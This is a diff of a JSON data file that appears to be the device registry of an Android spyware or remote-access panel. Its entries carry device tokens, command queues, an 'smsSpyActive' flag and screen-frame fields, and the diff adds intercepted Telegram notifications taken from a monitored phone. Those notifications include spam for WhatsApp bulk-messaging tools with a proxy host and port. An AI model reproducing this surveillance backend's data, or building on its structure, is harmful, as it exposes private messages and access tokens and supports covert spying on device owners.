@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776957176282,
+    "lastSeen": 1776957182311,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -16669,7 +16669,7 @@
     "deviceName": "HP-XXX-2D24",
     "ownerUsername": "is",
     "token": "34abd4f14a5676f3cd2d30b18941c847",
-    "lastSeen": 1776957177032,
+    "lastSeen": 1776957180200,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-23T15:09:35.885Z",
@@ -16685,6 +16685,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "1001 pesan baru dari 78 obrolan",
+        "time": "23/04 22:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776957182904
+      },
+      {
+        "appName": "Telegram",
+        "sender": "REHAT / SLOWRESS",
+        "content": "Ended task: #fNDPPPqV",
+        "time": "23/04 22:12",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776957179310
+      },
+      {
+        "appName": "Telegram",
+        "sender": "FELIX HOSTING TESTI",
+        "content": "\n📈 UPDATE HARGA WHATSAPP\n\n📍 Negara: Indonesia\n🕐 Waktu: 23/4/2026, 22.12.57\n📊 Total Server: 56\n📦 Stok Total: 1141\n\n━━━━━━━━━━━━━━━━━━━\n\n🟢 HARGA TURUN!\n\nServer 1\n💰 Rp2.850 → Rp2.250\n📉 Turun Rp600 (21.1%)\n📊 Rate: 100% | 📦 Stok: 1\n\nServer 13\n💰 Rp3.800 → Rp3.300\n📉 Turun Rp500 (13.2%)\n📊 Rate: 17.93% | 📦 Stok: 4\n\nServer 14\n💰 Rp3.900 → Rp3.300\n📉 Turun Rp600 (15.4%)\n📊 Rate: 13.16% | 📦 Stok: 5\n\nServer 15\n💰 Rp3.950 → Rp3.350\n📉 Turun Rp600 (15.2%)\n📊 Rate: 12.48% | 📦 Stok: 5\n\nServer 16\n💰 Rp3.950 → Rp3.350\n📉 Turun Rp600 (15.2%)\n📊 Rate: 16% | 📦 Stok: 5…",
+        "time": "23/04 22:12",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776957179291
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "1000 pesan baru dari 78 obrolan",
+        "time": "23/04 22:12",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776957179274
+      },
+      {
+        "appName": "Telegram",
+        "sender": "CUAN CUAN GACOR 2026 #13: Angkasa Bot Multi Device",
+        "content": "🖼 WEB BLATS GACOR 👾\nMONSTER WA\nKLIK TEKS DI ATAS 👋KLIK TEKS DI ATAS 👋\n\nMETHODS SUPAYA JARANG KENON PASANG PROXY 👾METHODS SUPAYA JARANG KENON PASANG PROXY 👾👾\n\n*\n\n*Host name*Host name\n : greenapi.org\n\nPort : 8443\nMedia : 777Port : 8443\nMedia : 777\n7\n*\n\n*INFO CUAN CUA*\n\n*INFO CUAN CUA\nN : @KESEXS\n 👾\nCHANNEL STOR AN : @Top1Blas👾\nCHANNEL STOR AN : @Top1Blas\nt 🌟",
+        "time": "23/04 22:12",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776957179163
+      },
       {
         "appName": "Telegram",
         "sender": "⏤͟͟͞͞𝑯𝙓 𝚰𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝚰 𝐓𝐄𝐒𝐓𝚰 𝐅𝐋𝐔𝐗𝐎",
